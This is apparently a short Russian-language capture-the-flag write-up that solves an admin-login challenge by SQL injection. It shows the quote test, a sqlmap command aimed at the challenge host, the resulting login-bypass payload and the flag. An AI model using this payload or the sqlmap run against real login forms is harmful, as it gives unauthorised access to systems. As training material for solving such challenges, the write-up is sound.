# А ты админ?
Видим обычную форму ввода в админ панель, проверим на уязвимость к sql инъекциям отправив ковычку.  
Получаем ошибку, а значит сервис уязвим  
![strings](https://github.com/Lip4ik/arctf/blob/main/osint/%D0%9F%D0%BE%D1%87%D1%82%D0%B8%20%D0%BD%D0%B0%D1%88%D0%B5%D0%BB/solver/vk.png)  

Натравим на него sqlmap  
`sqlmap -u "http://bnw.saintvegas.cc:1338" --data="user=admin&password=*" --risk=3 --level=3` 
Получаем строку, которую нужно отправить, чтобы получить доступ  
`-9028' OR 2644=2644-- pWKv`  
Наш флаг arctf{too_easy_sql_inj}   
 
